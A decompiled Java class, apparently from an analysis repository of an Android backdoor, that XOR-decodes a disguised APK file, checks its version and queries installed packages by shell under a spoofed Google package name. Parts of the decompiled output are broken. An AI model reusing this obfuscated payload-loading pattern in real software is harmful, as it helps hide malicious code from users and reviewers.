package com.google.android.sd.biz_dynamic_dex.base;

import android.content.Context;
import com.google.android.sd.utils.DataUtils;
import java.io.File;
import java.util.Iterator;

public class InstallApkChecker {
  private static final String KEY_CHECK_R = "com.google.android.sd.last_check_file_r";
  
  private static final String KEY_CHECK_T = "com.google.android.sd.last_check_file_t";
  
  private static final long MIN_APK_VER = 59600L;
  
  public static boolean checkApkVersion(Context paramContext, File paramFile, int paramInt) {
    return checkApkVersion(paramContext, paramFile, paramInt, false);
  }
  
  public static boolean checkApkVersion(Context paramContext, File paramFile, int paramInt, boolean paramBoolean) {
    // Byte code:
    //   0: invokestatic currentTimeMillis : ()J
    //   3: pop2
    //   4: invokestatic getCheckTmpApkFile : ()Ljava/io/File;
    //   7: astore #11
    //   9: aload #11
    //   11: invokevirtual exists : ()Z
    //   14: ifeq -> 23
    //   17: aload #11
    //   19: invokevirtual delete : ()Z
    //   22: pop
    //   23: ldc2_w -1
    //   26: lstore #6
    //   28: iload_3
    //   29: ifne -> 58
    //   32: aload_1
    //   33: invokestatic hasApkVersionChecked : (Ljava/io/File;)Z
    //   36: ifeq -> 58
    //   39: ldc 'com.google.android.sd.last_check_file_r'
    //   41: ldc2_w -1
    //   44: invokestatic getLong : (Ljava/lang/String;J)J
    //   47: ldc2_w 59600
    //   50: lcmp
    //   51: iflt -> 56
    //   54: iconst_1
    //   55: ireturn
    //   56: iconst_0
    //   57: ireturn
    //   58: aconst_null
    //   59: astore #10
    //   61: aconst_null
    //   62: astore #9
    //   64: sipush #30720
    //   67: newarray byte
    //   69: astore #12
    //   71: new java/io/FileInputStream
    //   74: dup
    //   75: aload_1
    //   76: invokespecial <init> : (Ljava/io/File;)V
    //   79: astore #8
    //   81: new java/io/FileOutputStream
    //   84: dup
    //   85: aload #11
    //   87: invokespecial <init> : (Ljava/io/File;)V
    //   90: astore_1
    //   91: aload #8
    //   93: aload #12
    //   95: invokevirtual read : ([B)I
    //   98: istore #5
    //   100: iload #5
    //   102: iconst_m1
    //   103: if_icmpeq -> 130
    //   106: getstatic com/google/android/sd/biz_dynamic_dex/base/Constants.DEBUG : Z
    //   109: ifne -> 118
    //   112: iconst_0
    //   113: istore #4
    //   115: goto -> 322
    //   118: aload_1
    //   119: aload #12
    //   121: iconst_0
    //   122: iload #5
    //   124: invokevirtual write : ([BII)V
    //   127: goto -> 91
    //   130: aload #8
    //   132: invokevirtual close : ()V
    //   135: aload_1
    //   136: invokevirtual close : ()V
    //   139: goto -> 213
    //   142: astore_0
    //   143: goto -> 149
    //   146: astore_0
    //   147: aconst_null
    //   148: astore_1
    //   149: goto -> 164
    //   152: aconst_null
    //   153: astore_1
    //   154: goto -> 193
    //   157: astore_0
    //   158: aconst_null
    //   159: astore_1
    //   160: aload #9
    //   162: astore #8
    //   164: aload #8
    //   166: ifnull -> 177
    //   169: aload #8
    //   171: invokevirtual close : ()V
    //   174: goto -> 177
    //   177: aload_1
    //   178: ifnull -> 185
    //   181: aload_1
    //   182: invokevirtual close : ()V
    //   185: aload_0
    //   186: athrow
    //   187: aconst_null
    //   188: astore_1
    //   189: aload #10
    //   191: astore #8
    //   193: aload #8
    //   195: ifnull -> 206
    //   198: aload #8
    //   200: invokevirtual close : ()V
    //   203: goto -> 206
    //   206: aload_1
    //   207: ifnull -> 213
    //   210: goto -> 135
    //   213: aload_0
    //   214: invokevirtual getPackageManager : ()Landroid/content/pm/PackageManager;
    //   217: aload #11
    //   219: invokevirtual getPath : ()Ljava/lang/String;
    //   222: sipush #128
    //   225: invokevirtual getPackageArchiveInfo : (Ljava/lang/String;I)Landroid/content/pm/PackageInfo;
    //   228: getfield versionCode : I
    //   231: istore_2
    //   232: iload_2
    //   233: i2l
    //   234: lstore #6
    //   236: goto -> 239
    //   239: aload #11
    //   241: invokevirtual delete : ()Z
    //   244: pop
    //   245: lload #6
    //   247: lconst_0
    //   248: lcmp
    //   249: ifle -> 269
    //   252: ldc 'com.google.android.sd.last_check_file_t'
    //   254: invokestatic currentTimeMillis : ()J
    //   257: invokestatic setLong : (Ljava/lang/String;J)Z
    //   260: pop
    //   261: ldc 'com.google.android.sd.last_check_file_r'
    //   263: lload #6
    //   265: invokestatic setLong : (Ljava/lang/String;J)Z
    //   268: pop
    //   269: lload #6
    //   271: ldc2_w 59600
    //   274: lcmp
    //   275: iflt -> 280
    //   278: iconst_1
    //   279: ireturn
    //   280: iconst_0
    //   281: ireturn
    //   282: astore_1
    //   283: goto -> 187
    //   286: astore_1
    //   287: goto -> 152
    //   290: astore #9
    //   292: goto -> 154
    //   295: astore #8
    //   297: goto -> 135
    //   300: astore_1
    //   301: goto -> 213
    //   304: astore #8
    //   306: goto -> 177
    //   309: astore_1
    //   310: goto -> 185
    //   313: astore #8
    //   315: goto -> 206
    //   318: astore_0
    //   319: goto -> 239
    //   322: iload #4
    //   324: iload #5
    //   326: if_icmpge -> 118
    //   329: iload #4
    //   331: iload_2
    //   332: irem
    //   333: ifne -> 350
    //   336: aload #12
    //   338: iload #4
    //   340: aload #12
    //   342: iload #4
    //   344: baload
    //   345: bipush #-85
    //   347: ixor
    //   348: i2b
    //   349: bastore
    //   350: iload #4
    //   352: iconst_1
    //   353: iadd
    //   354: istore #4
    //   356: goto -> 322
    // Exception table:
    //   from	to	target	type
    //   64	81	282	java/lang/Exception
    //   64	81	157	finally
    //   81	91	286	java/lang/Exception
    //   81	91	146	finally
    //   91	100	290	java/lang/Exception
    //   91	100	142	finally
    //   106	112	290	java/lang/Exception
    //   106	112	142	finally
    //   118	127	290	java/lang/Exception
    //   118	127	142	finally
    //   130	135	295	java/lang/Exception
    //   135	139	300	java/lang/Exception
    //   169	174	304	java/lang/Exception
    //   181	185	309	java/lang/Exception
    //   198	203	313	java/lang/Exception
    //   213	232	318	java/lang/Exception
  }
  
  public static long getApkCheckedVersion() {
    return DataUtils.getLong("com.google.android.sd.last_check_file_r", -1L);
  }
  
  public static int getApkSampleRate(File paramFile) {
    byte b = 1;
    try {
      String str = paramFile.getName();
      int j = str.indexOf('_');
      int i = b;
      if (j >= 0) {
        int k = str.indexOf('.');
        j++;
        i = b;
        if (k >= j)
          i = Integer.parseInt(str.substring(j, k)); 
      } 
      return i;
    } catch (Exception exception) {
      return 1;
    } 
  }
  
  private static File getCheckTmpApkFile() {
    return new File(DynamicUtils.getExtWorkDir(), "taf_check.dat2");
  }
  
  private static boolean hasApkVersionChecked(File paramFile) {
    long l1 = paramFile.lastModified();
    long l2 = DataUtils.getLong("com.google.android.sd.last_check_file_t", 0L);
    return (l2 == 0L) ? false : (!(l2 < l1));
  }
  
  public static Boolean isAppInstalled(Context paramContext, String paramString) {
    // Byte code:
    //   0: aload_0
    //   1: aload_1
    //   2: invokestatic isAppInstalledByPm : (Landroid/content/Context;Ljava/lang/String;)Ljava/lang/Boolean;
    //   5: astore_3
    //   6: aload_3
    //   7: ifnull -> 19
    //   10: aload_3
    //   11: astore_2
    //   12: aload_3
    //   13: invokevirtual booleanValue : ()Z
    //   16: ifne -> 33
    //   19: aload_0
    //   20: aload_1
    //   21: invokestatic isAppInstalledByShell : (Landroid/content/Context;Ljava/lang/String;)Ljava/lang/Boolean;
    //   24: astore_0
    //   25: aload_3
    //   26: astore_2
    //   27: aload_0
    //   28: ifnull -> 33
    //   31: aload_0
    //   32: astore_2
    //   33: aload_2
    //   34: areturn
  }
  
  public static Boolean isAppInstalledByPm(Context paramContext, String paramString) {
    try {
      Iterator iterator = paramContext.getPackageManager().getInstalledPackages(128).iterator();
      return Boolean.valueOf(false);
    } finally {
      paramContext = null;
    } 
  }
  
  public static Boolean isAppInstalledByShell(Context paramContext, String paramString) {
    // Byte code:
    //   0: invokestatic getRuntime : ()Ljava/lang/Runtime;
    //   3: ldc 'pm list package'
    //   5: invokevirtual exec : (Ljava/lang/String;)Ljava/lang/Process;
    //   8: astore_0
    //   9: aload_0
    //   10: invokevirtual getInputStream : ()Ljava/io/InputStream;
    //   13: astore_2
    //   14: new java/io/BufferedReader
    //   17: dup
    //   18: new java/io/InputStreamReader
    //   21: dup
    //   22: aload_2
    //   23: invokespecial <init> : (Ljava/io/InputStream;)V
    //   26: invokespecial <init> : (Ljava/io/Reader;)V
    //   29: astore_3
    //   30: aload_3
    //   31: invokevirtual readLine : ()Ljava/lang/String;
    //   34: astore #4
    //   36: aload #4
    //   38: ifnull -> 99
    //   41: aload #4
    //   43: invokestatic isEmpty : (Ljava/lang/CharSequence;)Z
    //   46: ifne -> 30
    //   49: aload #4
    //   51: ldc 'package:'
    //   53: invokevirtual startsWith : (Ljava/lang/String;)Z
    //   56: ifne -> 62
    //   59: goto -> 30
    //   62: aload_1
    //   63: aload #4
    //   65: bipush #8
    //   67: invokevirtual substring : (I)Ljava/lang/String;
    //   70: invokestatic equals : (Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Z
    //   73: ifeq -> 30
    //   76: iconst_1
    //   77: invokestatic valueOf : (Z)Ljava/lang/Boolean;
    //   80: astore_1
    //   81: aload_3
    //   82: invokestatic safetyClose : (Ljava/io/Closeable;)V
    //   85: aload_2
    //   86: invokestatic safetyClose : (Ljava/io/Closeable;)V
    //   89: aload_0
    //   90: ifnull -> 97
    //   93: aload_0
    //   94: invokevirtual destroy : ()V
    //   97: aload_1
    //   98: areturn
    //   99: iconst_0
    //   100: invokestatic valueOf : (Z)Ljava/lang/Boolean;
    //   103: astore_1
    //   104: aload_3
    //   105: invokestatic safetyClose : (Ljava/io/Closeable;)V
    //   108: aload_2
    //   109: invokestatic safetyClose : (Ljava/io/Closeable;)V
    //   112: aload_0
    //   113: ifnull -> 120
    //   116: aload_0
    //   117: invokevirtual destroy : ()V
    //   120: aload_1
    //   121: areturn
    //   122: astore #4
    //   124: aload_3
    //   125: astore_1
    //   126: aload #4
    //   128: astore_3
    //   129: goto -> 162
    //   132: aload_3
    //   133: astore_1
    //   134: goto -> 186
    //   137: astore_3
    //   138: aconst_null
    //   139: astore_1
    //   140: goto -> 162
    //   143: aconst_null
    //   144: astore_1
    //   145: goto -> 186
    //   148: astore_3
    //   149: goto -> 158
    //   152: goto -> 182
    //   155: astore_3
    //   156: aconst_null
    //   157: astore_0
    //   158: aconst_null
    //   159: astore_2
    //   160: aconst_null
    //   161: astore_1
    //   162: aload_1
    //   163: invokestatic safetyClose : (Ljava/io/Closeable;)V
    //   166: aload_2
    //   167: invokestatic safetyClose : (Ljava/io/Closeable;)V
    //   170: aload_0
    //   171: ifnull -> 178
    //   174: aload_0
    //   175: invokevirtual destroy : ()V
    //   178: aload_3
    //   179: athrow
    //   180: aconst_null
    //   181: astore_0
    //   182: aconst_null
    //   183: astore_2
    //   184: aconst_null
    //   185: astore_1
    //   186: aload_1
    //   187: invokestatic safetyClose : (Ljava/io/Closeable;)V
    //   190: aload_2
    //   191: invokestatic safetyClose : (Ljava/io/Closeable;)V
    //   194: aload_0
    //   195: ifnull -> 202
    //   198: aload_0
    //   199: invokevirtual destroy : ()V
    //   202: aconst_null
    //   203: areturn
    //   204: astore_0
    //   205: goto -> 180
    //   208: astore_1
    //   209: goto -> 152
    //   212: astore_1
    //   213: goto -> 143
    //   216: astore_1
    //   217: goto -> 132
    //   220: astore_0
    //   221: aload_1
    //   222: areturn
    //   223: astore_0
    //   224: aload_1
    //   225: areturn
    //   226: astore_0
    //   227: goto -> 178
    //   230: astore_0
    //   231: aconst_null
    //   232: areturn
    // Exception table:
    //   from	to	target	type
    //   0	9	204	java/lang/Exception
    //   0	9	155	finally
    //   9	14	208	java/lang/Exception
    //   9	14	148	finally
    //   14	30	212	java/lang/Exception
    //   14	30	137	finally
    //   30	36	216	java/lang/Exception
    //   30	36	122	finally
    //   41	59	216	java/lang/Exception
    //   41	59	122	finally
    //   62	81	216	java/lang/Exception
    //   62	81	122	finally
    //   93	97	220	finally
    //   99	104	216	java/lang/Exception
    //   99	104	122	finally
    //   116	120	223	finally
    //   174	178	226	finally
    //   198	202	230	finally
  }
}


/* Location:              C:\Users\daimiaopeng\Downloads\pinduoduo_backdoor-main\pinduoduo_backdoor-main\dex\be7a2b643d7e8543f49994ffeb0ee0b6-dex2jar.jar!\com\google\android\sd\biz_dynamic_dex\base\InstallApkChecker.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       1.1.3
 */